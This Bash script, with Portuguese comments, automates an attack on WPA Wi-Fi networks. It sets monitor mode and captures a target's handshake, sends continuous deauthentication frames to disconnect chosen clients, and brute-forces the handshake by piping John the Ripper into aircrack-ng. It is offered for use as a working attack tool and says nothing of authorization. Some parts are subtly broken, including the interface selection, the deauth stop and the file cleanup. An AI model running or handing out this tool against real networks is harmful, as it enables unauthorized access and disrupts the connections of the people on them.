#!/bin/bash

# Checar se todas as ferramentas necessárias estão instaladas
check_dependencies() {
    local dependencies=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng" "john")
    for cmd in "${dependencies[@]}"; do
        if ! command -v $cmd &> /dev/null; then
            echo "Erro: $cmd não está instalado."
            exit 1
        fi
    done
}

# Função para selecionar a placa de rede Wi-Fi
select_wifi_interface() {
    local interfaces=$(iwconfig 2>/dev/null | awk '/IEEE 802.11/ {print $1}')
    if [[ -z $interfaces ]]; then
        echo "Nenhuma placa de rede Wi-Fi encontrada."
        exit 1
    fi

    echo "Selecione a placa de rede Wi-Fi:"
    select interface in $interfaces; do
        if [[ -n $interface ]]; then
            echo "Placa de rede Wi-Fi selecionada: $interface"
            echo $interface
            return
        fi
    done
}

# Função para capturar pacotes
start_capture() {
    local interface=$1
    local bssid=$2
    local channel=$3
    local file_name=$4

    # Validação dos parâmetros de entrada
    if [[ -z $interface || -z $bssid || -z $channel || -z $file_name ]]; then
        echo "Parâmetros insuficientes. Uso: start_capture <interface> <bssid> <channel> <file_name>"
        exit 1
    fi

    # Iniciar o modo monitor na interface de rede sem fio
    sudo airmon-ng start $interface

    # Iniciar airodump-ng para capturar dispositivos conectados à rede escolhida
    sudo airodump-ng -c $channel --bssid $bssid -w $file_name "${interface}mon" --ignore-negative-one &
    capture_pid=$!
    echo "Captura de pacotes iniciada, pid: $capture_pid"

    # Monitorar a captura para parar automaticamente após capturar o handshake
    while : ; do
        if [[ -f "${file_name}-01.cap" ]]; then
            # Verificar se o handshake foi capturado
            if aircrack-ng -a 2 -w /dev/null "${file_name}-01.cap" | grep -q "1 handshake"; then
                echo "Handshake capturado!"
                sudo kill $capture_pid
                wait $capture_pid 2>/dev/null
                break
            fi
        fi
        sleep 1
    done

    # Parar o modo monitor na interface de rede sem fio
    sudo airmon-ng stop "${interface}mon"
}

# Função para listar dispositivos conectados
list_connected_devices() {
    local interface=$1
    local bssid=$2
    local channel=$3
    local file_name=$4

    if [[ -z $interface || -z $bssid || -z $channel || -z $file_name ]]; then
        echo "Parâmetros insuficientes. Uso: list_connected_devices <interface> <bssid> <channel> <file_name>"
        exit 1
    fi

    sudo airodump-ng -c $channel --bssid $bssid -w $file_name "${interface}mon" --ignore-negative-one &
    airodump_pid=$!
    sleep 10  # Esperar 10 segundos para coletar informações
    sudo kill $airodump_pid
    wait $airodump_pid 2>/dev/null
}

# Função para enviar pacotes de desautenticação
start_deauth() {
    local interface=$1
    local target_mac=$2
    local bssid=$3

    if [[ -z $interface || -z $target_mac || -z $bssid ]]; then
        echo "Parâmetros insuficientes. Uso: start_deauth <interface> <target_mac> <bssid>"
        exit 1
    fi

    sudo aireplay-ng --deauth 0 -a $bssid -c $target_mac "${interface}mon" &
    deauth_pid=$!
    echo "Envio de pacotes de desautenticação iniciado, pid: $deauth_pid"
}

# Função para parar o envio de pacotes de desautenticação
stop_deauth() {
    if [[ ! -z $deauth_pid ]]; then
        sudo kill $deauth_pid
        wait $deauth_pid 2>/dev/null
        echo "Envio de pacotes de desautenticação interrompido."
        deauth_pid=""
    else
        echo "Nenhum processo de desautenticação em andamento."
    fi
}

# Função para descriptografar handshakes
decrypt_handshakes() {
    local bssid=$1
    shift
    local cap_files=("$@")

    if [[ -z $bssid || ${#cap_files[@]} -eq 0 ]]; then
        echo "Parâmetros insuficientes. Uso: decrypt_handshakes <bssid> <cap_files...>"
        exit 1
    fi

    for cap_file in "${cap_files[@]}"; do
        john --incremental --stdout | aircrack-ng -b $bssid -w - "$cap_file"
    done
}

# Função para limpar arquivos temporários
cleanup_temp_files() {
    local file_prefix=$1
    if [[ -z $file_prefix ]]; then
        echo "Parâmetro insuficiente. Uso: cleanup_temp_files <file_prefix>"
        exit 1
    fi
    rm -rf "${file_prefix}-*.cap" "${file_prefix}-*.csv" "${file_prefix}-*.netxml"
    echo "Arquivos temporários limpos."
}

# Checar as dependências ao iniciar o script
check_dependencies

# Parâmetros de entrada
COMMAND=$1
INTERFACE=$2
BSSID=$3
CHANNEL=$4
FILE_NAME=$5
TARGET_MAC=$6
CAP_FILES=("${@:7}")

# Selecionar a placa de rede Wi-Fi
if [[ -z $INTERFACE ]]; then
    INTERFACE=$(select_wifi_interface)
fi

case $COMMAND in
    start_capture)
        start_capture $INTERFACE $BSSID $CHANNEL $FILE_NAME
        ;;
    list_devices)
        list_connected_devices $INTERFACE $BSSID $CHANNEL $FILE_NAME
        ;;
    start_deauth)
        start_deauth $INTERFACE $TARGET_MAC $BSSID
        ;;
    stop_deauth)
        stop_deauth
        ;;
    decrypt_handshakes)
        decrypt_handshakes $BSSID "${CAP_FILES[@]}"
        ;;
    cleanup)
        cleanup_temp_files $FILE_NAME
        ;;
    *)
        echo "Comando desconhecido: $COMMAND"
        echo "Uso: $0 {start_capture|list_devices|start_deauth|stop_deauth|decrypt_handshakes|cleanup} <parameters>"
        ;;
esac

